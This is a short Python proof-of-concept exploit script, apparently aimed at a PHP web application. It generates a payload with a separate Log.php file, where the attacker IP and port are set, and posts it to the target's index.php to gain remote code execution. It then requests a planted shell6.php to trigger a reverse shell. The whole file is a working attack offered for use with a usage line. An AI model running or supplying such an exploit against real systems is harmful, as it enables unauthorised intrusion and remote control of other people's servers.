import sys
import requests
from bs4 import BeautifulSoup
import os

#you should change ip and port  in Log.php

#input parameter
if(len(sys.argv) < 2):
    print("[+] Usage: python poc.py target_url");
    print("[+] For Example: python poc.py http://192.168.150.1")
    exit()


target = sys.argv[1]
session = requests.session()

print("[+] Read Payload from poc.txt")
os.system("php Log.php")
f = open('./poc.txt', 'r')
payload = f.readlines();
os.system("rm poc.txt")

rceUrl = target + "/index.php"
data = {"param" : payload}


rceRes = session.post(rceUrl, data = data)

print("[+] Triger reverse shell")
shellUrl = target + "/scriptz/shell6.php"
session.get(shellUrl)

